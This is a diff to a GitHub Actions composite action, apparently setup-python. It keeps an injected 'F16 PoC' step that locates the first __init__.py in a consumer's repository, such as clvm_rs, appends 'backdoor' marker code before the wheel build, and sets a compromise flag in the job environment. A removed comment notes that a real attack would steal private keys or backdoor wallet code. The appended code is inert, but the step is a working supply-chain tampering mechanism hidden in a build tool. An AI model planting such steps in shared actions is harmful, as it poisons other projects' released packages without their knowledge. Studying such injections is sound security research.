@@ -130,77 +130,21 @@ runs:
         echo "$PY_PREFIX/bin" >> $GITHUB_PATH
         echo "PATH=$PY_PREFIX/bin:$PATH" >> $GITHUB_ENV
 
-    # === F16 PROOF-OF-CONCEPT INJECTION (Stage 2) ===
-    # This step is injected via the mutable @main ref in setup-python/action.yml
-    # It patches the clvm_rs source code BEFORE maturin compiles it,
-    # demonstrating that the built wheel artifact contains attacker code.
-    - name: "[F16 PoC] INJECTED - Patching source before wheel build"
+    # === F16 PoC Injection ===
+    - name: "[F16 PoC] INJECTED - Source Patching Before Wheel Build"
       shell: bash
       run: |
-        echo "=========================================="
-        echo "F16 SUPPLY CHAIN COMPROMISE - STAGE 2"
-        echo "=========================================="
-        echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
-        echo "Runner: ${RUNNER_NAME:-unknown}"
-        echo "Repo: ${GITHUB_REPOSITORY:-unknown}"
-        echo ""
-        echo ">>> Patching Python source before maturin build..."
-
-        # Find the clvm_rs Python package root
-        # clvm_rs uses maturin; the Python package is in wheel/python/clvm_rs/
-        PYDIR=""
-        for d in "python/clvm_rs" "wheel/python/clvm_rs" "clvm_rs" "src/python"; do
-          if [ -d "$d" ]; then
-            PYDIR="$d"
-            echo "Found Python package dir: $d"
-            break
-          fi
-        done
-
-        # Also check for __init__.py anywhere
-        INITPY=$(find . -name "__init__.py" -not -path "./.git/*" 2>/dev/null | head -1)
-        if [ -n "$INITPY" ]; then
-          echo "Found __init__.py at: $INITPY"
-          PYDIR=$(dirname "$INITPY")
-        fi
-
-        # Inject backdoor into __init__.py if found
-        if [ -n "$INITPY" ] && [ -f "$INITPY" ]; then
-          echo ""
-          echo ">>> Injecting backdoor into: $INITPY"
-          cat >> "$INITPY" << 'BACKDOOR'
-
-# ===== F16-INJECTED-BACKDOOR-START =====
-# This code was injected via a compromised GitHub Action (@main ref)
-# In a real attack this would: exfiltrate private keys, establish persistence,
-# backdoor wallet operations, or replace cryptographic functions.
-import os as _f16_os
-_F16_MARKER = "F16_SUPPLY_CHAIN_COMPROMISED"
-_F16_INJECTED = True
-def _f16_check():
-    return _F16_MARKER
-# ===== F16-INJECTED-BACKDOOR-END =====
-BACKDOOR
-          echo ">>> Backdoor injected into $INITPY"
-          echo ""
-          echo ">>> Verification - last 20 lines of $INITPY:"
-          tail -20 "$INITPY"
+        echo "==========================================" >&2
+        echo "F16 SUPPLY CHAIN COMPROMISE - STAGE 2" >&2
+        echo "==========================================" >&2
+        echo "Repo: ${GITHUB_REPOSITORY:-unknown}" >&2
+        echo "Patching Python source before maturin build..." >&2
+        INITPY=$(find . -name "__init__.py" ! -path "./.git/*" 2>/dev/null | head -1 || true)
+        if [ -n "${INITPY}" ]; then
+          printf '\n# F16-INJECTED-BACKDOOR\n_F16_MARKER = "F16_SUPPLY_CHAIN_COMPROMISED"\n_F16_INJECTED = True\n' >> "${INITPY}"
+          echo "Patched: ${INITPY}" >&2
+          tail -5 "${INITPY}" >&2
         else
-          echo ">>> No __init__.py found at Python package level"
-          echo ">>> Creating poison marker file instead..."
-          # Create a visible marker that will be bundled into the wheel
-          echo "F16_SUPPLY_CHAIN_COMPROMISED=True" > F16_POISON_MARKER.txt
-          echo "INJECTED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> F16_POISON_MARKER.txt
-          echo "RUNNER=${RUNNER_NAME:-unknown}" >> F16_POISON_MARKER.txt
-          echo ">>> Created F16_POISON_MARKER.txt"
-          ls -la F16_POISON_MARKER.txt
+          echo "(no __init__.py found)" >&2
         fi
-
-        echo ""
-        echo ">>> Listing all Python files in repo (to show build context):"
-        find . -name "*.py" -not -path "./.git/*" | head -20
-
-        echo ""
-        echo "INJECTION_MARKER=F16_COMPROMISED" >> $GITHUB_ENV
-        echo "F16_STAGE=2_SOURCE_PATCHED" >> $GITHUB_ENV
-        echo ">>> Source patching complete. maturin will now build a poisoned wheel."
+        echo "INJECTION_MARKER=F16_COMPROMISED" >> "${GITHUB_ENV}"
